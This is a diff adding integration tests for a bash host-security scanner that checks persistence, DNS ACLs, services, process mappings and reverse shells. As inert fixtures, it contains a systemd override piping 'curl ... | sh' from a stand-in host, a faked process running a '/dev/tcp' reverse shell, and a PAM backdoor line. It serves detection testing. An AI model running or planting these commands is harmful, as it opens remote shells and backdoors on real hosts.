@@ -61,6 +61,123 @@ class Integration(unittest.TestCase):
         findings = self.findings()
         self.assertEqual(findings, [], findings)
 
+    def test_minimal_image_without_hostname_keeps_stat_checks(self):
+        (self.root/'etc/hostname').unlink()
+        found = self.findings()
+        self.assertFalse([r for r in found if r['severity']=='ERROR'])
+        self.assertFalse([r for r in found if r['check_id'] in {'RC001','AUT003','AUT004'} and
+                          'stat unavailable' in r.get('evidence','')])
+
+    def test_benign_php_mysql_units_and_symlink_permissions(self):
+        self.put('var/www/form.php', '<?php echo htmlspecialchars($_GET["name"]);\n')
+        self.put('var/www/decode.php', '<?php echo base64_decode($_POST["image"]);\n')
+        self.put('etc/mysql/my.cnf', '[mysqld]\nskip-grant-tables=ON\nskip-grant-tables=OFF\n'
+                 '[client]\nskip-grant-tables\n')
+        self.put('root/.config/systemd/user/normal.service', '[Service]\nExecStart=/usr/bin/true\n')
+        target = self.put('root/profile', '# normal startup\n')
+        (self.root/'root/.bashrc').unlink()
+        (self.root/'root/.bashrc').symlink_to(target)
+        self.assertEqual(self.findings(), [])
+        target.chmod(0o666)
+        self.assertIn('RC002', {r['check_id'] for r in self.findings()})
+
+    def test_user_unit_dropin_dedup_and_drift(self):
+        baseline = self.base/'units.base'
+        self.run_scan('--baseline', baseline)
+        self.put('root/.config/systemd/user/normal.service', '[Service]\nExecStart=/usr/bin/true\n')
+        self.put('root/.config/systemd/user/normal.service.d/override.conf',
+                 '[Service]\n  ExecStart=/bin/sh -c "curl https://example.invalid/test | sh"')
+        with (self.root/'etc/passwd').open('a') as out:
+            out.write('shared:x:1001:1001:shared:/root:/bin/bash\n')
+        found = self.findings('--diff', baseline)
+        payloads = [r for r in found if r['check_id']=='PER002']
+        self.assertEqual(len(payloads), 1, payloads)
+        self.assertTrue(any(r['title']=='ADDED UNITEXEC' and 'override.conf' in r['target']
+                            for r in found))
+
+    def test_multiline_dns_acl_and_negative_controls(self):
+        self.put('etc/bind/named.conf', '/* allow-update { any; }; */\n'
+                 'acl company { 10.1.1.1; };\nallow-transfer { company; };\n'
+                 'allow-update { !any; any; }; // denied first\n')
+        self.assertEqual(self.findings(), [])
+        self.put('etc/bind/named.conf', 'allow-update\n{\nany;\n};\n'
+                 'allow-transfer {\n::/0;\n};\n')
+        ids = {r['check_id'] for r in self.findings()}
+        self.assertTrue({'DNS002', 'DNS003'} <= ids)
+
+    def test_remediation_without_scratch_or_evidence_directory(self):
+        self.put('etc/ssh/sshd_config', 'PermitRootLogin yes\n')
+        target = self.base/'review.sh'
+        env = dict(os.environ, TMPDIR=str(self.base/'does-not-exist'))
+        result = subprocess.run(['bash', str(SCRIPT), '--root', str(self.root),
+                                 '--remediate', str(target)], env=env,
+                                capture_output=True, text=True, timeout=90)
+        self.assertEqual(result.returncode, 3, result.stderr)
+        text = target.read_text()
+        self.assertIn('COULD DISRUPT SSH', text)
+        self.assertTrue(all(not line.strip() or line.startswith('#') for line in text.splitlines()))
+        self.assertEqual({p.name for p in self.base.iterdir()}, {'victim', 'review.sh'})
+
+    def test_runtime_service_policy_uses_kernel_argv_and_relocated_ports(self):
+        # Exercise the collector/check boundary with inert synthetic proc files.
+        # No daemon or planted command is ever executed.
+        proc = self.root/'proc'
+        for pid, name, args in [(1, 'init', ['init']),
+                (20, 'distccd', ['distccd', '--allow=0.0.0.0/0']),
+                (21, 'Xtigervnc', ['Xtigervnc', '-SecurityTypes', 'TLSNone,VncAuth']),
+                (22, 'mysqld', ['mysqld', '--skip-grant-tables=OFF'])]:
+            self.put(f'proc/{pid}/stat', f'{pid} ({name}) S 1 1 1 0 0 0\n')
+            (proc/str(pid)/'cmdline').write_bytes(b'\0'.join(a.encode() for a in args)+b'\0')
+        command = '''source <(sed '$d' "$1")
+ROOT=$2; PROCFS=$ROOT/proc; CAP_PROC=1; CAP_PS=0
+col_proc
+LISTEN_ROWS=('tcp|0.0.0.0|43632|0|120' 'tcp|0.0.0.0|45900|1000|121')
+SOCK_PID[120]=20; SOCK_PID[121]=21
+run_check chk_services
+'''
+        result = subprocess.run(['bash', '-c', command, '_', str(SCRIPT), str(self.root)],
+                                text=True, capture_output=True, timeout=10)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        rows = [line.split('\t') for line in result.stdout.splitlines()]
+        found = {r[1]:r for r in rows if r[0]=='FIND'}
+        self.assertIn('SRV001', found)
+        self.assertIn('43632', found['SRV001'][7])
+        self.assertEqual(found['SRV004'][2], 'CRIT')
+        self.assertNotIn('SRV005', found)  # socket creator UID is not daemon EUID
+        self.assertNotIn('SQL005', found)
+        self.assertIn(['OBS', 'SERVICE_BIND', 'vnc', 'tcp:0.0.0.0:45900'], rows)
+
+    def test_mapping_dedup_and_jit_inventory(self):
+        mapping = '1000-2000 r-xp 00000000 00:01 99 /memfd:JITCode (deleted)\n'
+        self.put('proc/20/maps', mapping + mapping +
+                 '3000-4000 r-xp 00000000 00:01 100 /tmp/payload (deleted)\n')
+        command = '''source <(sed '$d' "$1")
+ROOT=$2; PROCFS=$ROOT/proc; CAP_PROC=1; PROC_PIDS=(20 21)
+PROC_COMM[20]=fixture; PROC_COMM[21]=unreadable
+run_check chk_process_mappings
+'''
+        result = subprocess.run(['bash', '-c', command, '_', str(SCRIPT), str(self.root)],
+                                text=True, capture_output=True, timeout=10)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        rows = [line.split('\t') for line in result.stdout.splitlines()]
+        findings = [r for r in rows if r[0]=='FIND']
+        self.assertEqual([(r[1],r[2]) for r in findings], [('MAP001','INFO'),('MAP002','HIGH')])
+        self.assertTrue(any(r[:2]==['SKIP','MAP000'] for r in rows))
+
+    def test_reverse_shell_rule_does_not_flag_scanner_rule_text(self):
+        command = '''source <(sed '$d' "$1")
+CAP_PROC=1; PROC_PIDS=(20 21 22); PROCFS=$2/proc
+PROC_COMM[20]=awk; PROC_CMD[20]="awk $RULES_PROG"
+PROC_COMM[21]=bash; PROC_CMD[21]='bash -c bash -i >&/dev/tcp/192.0.2.1/4444 0>&1'
+PROC_COMM[22]=bash; PROC_CMD[22]='bash -c echo /dev/tcp/example'
+run_check chk_extra_procs
+'''
+        result = subprocess.run(['bash','-c',command,'_',str(SCRIPT),str(self.root)],
+                                text=True,capture_output=True,timeout=10)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        findings = [r.split('\t') for r in result.stdout.splitlines() if r.startswith('FIND\tPRC010\t')]
+        self.assertEqual([r[6] for r in findings], ['pid=21'])
+
     def test_service_persistence_and_webshell_fixtures(self):
         fixtures = {
             'etc/pam.d/backdoor': 'auth sufficient pam_permit.so\n',
@@ -192,6 +309,10 @@ class Integration(unittest.TestCase):
         self.run_scan('--baseline',baseline)
         self.assertEqual(self.run_scan('--diff',baseline,'--full').returncode,2)
         original=baseline.read_text()
+        baseline.write_text(original.replace('META\tschema\t2', 'META\tschema\t1'))
+        rejected=self.run_scan('--diff',baseline,'--force')
+        self.assertEqual(rejected.returncode,2)
+        self.assertIn('baseline schema incompatible',rejected.stderr)
         baseline.write_text(original+'MARK\n')
         self.assertEqual(self.run_scan('--diff',baseline).returncode,2)
         protected=self.base/'existing.json'
